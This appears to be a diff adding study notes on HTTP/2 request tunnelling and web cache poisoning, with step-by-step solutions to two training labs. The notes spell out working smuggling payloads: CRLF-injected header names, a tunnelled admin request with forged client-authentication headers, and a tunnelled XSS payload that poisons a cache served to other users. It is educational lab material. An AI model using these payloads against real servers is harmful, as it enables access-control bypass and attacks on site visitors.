+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+comment=X-Internal-Header: secretContent-Length: 3
+x=1
+-------------------------------------------------------
+
+🔘️ Blind request tunnelling
+
+▫️  Some front-end servers read in all the data they receive from the back-end. 
+▫️ This means that if you successfully tunnel a request, they will potentially forward both responses to the client, with the response to the tunnelled request nested inside the body of the main response.
+
+▫️ Other front-end servers only read in the number of bytes specified in the Content-Length header of the response, so only the first response is forwarded to the client. 
+▫️ This results in a blind request tunnelling vulnerability because you won't be able to see the response to your tunnelled request. 
+
+							⚪️ Non-blind request tunnelling using HEAD
+							
+▫️ Blind request tunnelling can be tricky to exploit, but you can occasionally make these vulnerabilities non-blind by using HEAD requests.
+
+▫️ Responses to HEAD requests often contain a content-length header even though they don't have a body of their own. 
+▫️ This normally refers to the length of the resource that would be returned by a GET request to the same endpoint. 
+▫️ Some front-end servers fail to account for this and attempt to read in the number of bytes specified in the header regardless. 
+▫️ If you successfully tunnel a request past a front-end server that does this, this behavior may cause it to over-read the response from the back-end. 
+▫️ As a result, the response you receive may contain bytes from the start of the response to your tunnelled request. 
+
+◽️ Request
+
+:method 	HEAD
+:path 	/example
+:authority 	vulnerable-website.com
+foo 	
+
+bar\r\n
+\r\n
+GET /tunnelled HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+X: x							
+							 
+ 
+◽️ Response
+
+:status 	200
+content-type 	text/html
+content-length 	131
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 4286
+
+<!DOCTYPE html>
+<h1>Tunnelled</h1>
+<p>This is a tunnelled respo
+ 
+ 
+▫️ As you're effectively mixing the content-length header from one response with the body of another, using this technique successfully is a bit of a balancing act.
+
+▫️ If the endpoint to which you send your HEAD request returns a resource that is shorter than the tunnelled response you're trying to read, it may be truncated before you can see anything interesting, as in the example above. 
+▫️ On the other hand, if the returned content-length is longer than the response to your tunnelled request, you will likely encounter a timeout as the front-end server is left waiting for additional bytes to arrive from the back-end.
+
+▫️ Fortunately, with a bit of trial and error, you can often overcome these issues using one of the following solutions:
+
+▫️ Point your HEAD request to a different endpoint that returns a longer or shorter resource as required.
+
+▫️ If the resource is too short, use a reflected input in the main HEAD request to inject arbitrary padding characters. Even though you won't actually see your input being reflected, the returned content-length will still increase accordingly.
+
+▫️ If the resource is too long, use a reflected input in the tunnelled request to inject arbitrary characters so that the length of the tunnelled response matches or exceeds the length of the expected content.
+
+🔘️ Lab: Bypassing access controls via HTTP/2 request tunnelling
+
+▫️ This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names.
+
+-------------------------------------------------------------------------------------------
+▫️Send the GET / request to Burp Repeater. Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.
+
+▫️Using the Inspector, append an arbitrary header to the end of the request and try smuggling a Host header in its name as follows:
+
+◽️Name
+    foo: bar\r\n
+    Host: abc
+
+    Value
+    xyz
+
+▫️Observe that the error response indicates that the server processes your injected host, confirming that the lab is vulnerable to CRLF injection via header names.
+
+▫️In the browser, notice that the lab's search function reflects your search query in the response. Send the most recent GET /?search=YOUR-SEARCH-QUERY request to Burp Repeater and upgrade it to an HTTP/2 request.
+
+▫️In Burp Repeater, right-click on the request and select Change request method. Send the request and notice that the search function still works when you send the search parameter in the body of a POST request.
+
+▫️Add an arbitrary header and use its name field to inject a large Content-Length header and an additional search parameter as follows:
+
+◽️Name
+
+    foo: bar\r\n
+    Content-Length: 500\r\n
+    \r\n
+    search=x
+
+    Value
+    xyz
+
+◽️In the main body of the request (in the message editor panel) append arbitrary characters to the original search parameter until the request is longer than the smuggled Content-Length header.
+
+▫️ Send the request and observe that the response now reflects the headers that were appended to your request by the front-end server:
+    0 search results for 'x: xyz
+    Content-Length: 644
+    cookie: session=YOUR-SESSION-COOKIE
+    X-SSL-VERIFIED: 0
+    X-SSL-CLIENT-CN: null
+    X-FRONTEND-KEY: YOUR-UNIQUE-KEY
+
+▫️Notice that these appear to be headers used for client authentication.
+
+▫️Change the request method to HEAD and edit your malicious header so that it smuggles a request for the admin panel. Include the three client authentication headers, making sure to update their values as follows:
+
+◽️Name
+
+    foo: bar\r\n
+    \r\n
+    GET /admin HTTP/1.1\r\n
+    X-SSL-VERIFIED: 1\r\n
+    X-SSL-CLIENT-CN: administrator\r\n
+    X-FRONTEND-KEY: YOUR-UNIQUE-KEY\r\n
+    \r\n
+
+    Value
+    xyz
+
+▫️Send the request and observe that you receive an error response saying that not enough bytes were received. This is because the Content-Length of the requested resource is longer than the tunnelled response you're trying to read.
+
+▫️Change the :path pseudo-header so that it points to an endpoint that returns a shorter resource. In this case, you can use /login.
+
+▫️Send the request again. You should see the start of the tunnelled HTTP/1.1 response nested in the body of your main response.
+
+▫️In the response, find the URL for deleting Carlos (/admin/delete?username=carlos), then update the path in your tunnelled request accordingly and resend it. Although you will likely encounter an error response, Carlos is deleted and the lab is solved.
+
+------------------------------------------------------------------------------------------------------------
+
+								🔘️ Web cache poisoning via HTTP/2 request tunnelling
+
+▫️ Even though request tunnelling is generally more limited than classic request smuggling, you can sometimes still construct high-severity attacks. 
+▫️ For example, you may be able to combine the request tunnelling techniques we've looked at so far for an extra-powerful form of web cache poisoning.
+
+▫️ With non-blind request tunnelling, you can effectively mix and match the headers from one response with the body of another. 
+▫️ If the response in the body reflects unencoded user input, you may be able to leverage this behavior for reflected XSS in contexts where the browser would not normally execute the code.
+
+▫️ For example, the following response contains unencoded, attacker-controllable input:
+
+------------------------------------------------------------------
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{ "name" : "test<script>alert(1)</script>" }
+[etc.]
+-------------------------------------------------
+▫️ By itself, this is relatively harmless. The Content-Type means that this payload will simply be interpreted as JSON by the browser. 
+▫️ But consider what would happen if you tunnel the request to the back-end instead. 
+▫️ This response would appear inside the body of a different response, effectively inheriting its headers, including the content-type.
+
+----------------------------------------
+
+:status 	200
+content-type 	text/html
+content-length 	174
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{ "name" : "test<script>alert(1)</script>" }
+[etc.]
+----------------------------------------------------
+
+▫️ As caching takes place on the front-end, caches can also be tricked into serving these mixed responses to other users. 								
+ 
+ 
+ ⚪️ Lab: Web cache poisoning via HTTP/2 request tunnelling
+ 
+ ---------------------------------------------------------------------------------------------------
+▫️ Send a request for GET / to Burp Repeater. Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.
+
+▫️ Using the Inspector, try smuggling an arbitrary header in the :path pseudo-header, making sure to preserve a valid request line for the downgraded request as follows:
+
+◽️Name
+
+    :path
+
+◽️Value
+
+    /?cachebuster=1 HTTP/1.1\r\n
+    Foo: bar
+
+▫️Observe that you still receive a normal response, confirming that you're able to inject via the :path.
+
+▫️Change the request method to HEAD and use the :path pseudo-header to tunnel a request for another arbitrary endpoint as follows:
+
+◽️Name
+
+    :path
+
+▫️Value
+
+    /?cachebuster=2 HTTP/1.1\r\n
+    Host: YOUR-LAB-ID.web-security-academy.net\r\n
+    \r\n
+    GET /post?postId=1 HTTP/1.1\r\n
+    Foo: bar
+
+▫️ Note that we've ensured that the main request is valid by including a Host header before the split. We've also left an arbitrary trailing header to capture the HTTP/1.1 suffix that will be appended to the request line by the front-end during rewriting.
+
+▫️Send the request and observe that you are able to view the tunnelled response. If you can't, try using a different postId.
+
+▫️Remove everything except the path and cachebuster query parameter from the :path pseudo-header and resend the request. Observe that you have successfully poisoned the cache with the tunnelled response.
+
+▫️Now you need to find a gadget that reflects an HTML-based XSS payload without encoding or escaping it. Send a response for GET /resources and observe that this triggers a redirect to /resources/.
+
+▫️Try tunnelling this request via the :path pseudo-header, including an XSS payload in the query string as follows.
+
+◽️Name
+
+    :path
+
+◽️Value
+
+    /?cachebuster=3 HTTP/1.1\r\n
+    Host: YOUR-LAB-ID.web-security-academy.net\r\n
+    \r\n
+    GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
+    Foo: bar
+
+▫️Observe that the request times out. This is because the Content-Length header in the main response is longer than the nested response to your tunnelled request.
+
+▫️From the proxy history, check the Content-Length in the response to a normal GET / request and make a note of its value. 
+▫️Go back to your malicious request in Burp Repeater and add enough arbitrary characters after the closing </script> tag to pad your reflected payload so that the length of the tunnelled response will exceed the Content-Length you just noted.
+
+▫️Send the request and confirm that your payload is successfully reflected in the tunnelled response. If you still encounter a timeout, you may not have added enough padding.
+
+▫️While the cache is still poisoned, visit the home page using the same cachebuster query parameter and confirm that the alert() fires.
+
+▫️In the Inspector, remove the cachebuster from your request and resend it until you have poisoned the cache. Keep resending the request every 5 seconds or so to keep the cache poisoned until the victim visits the home page and the lab is solved.
+
+-------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+    
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
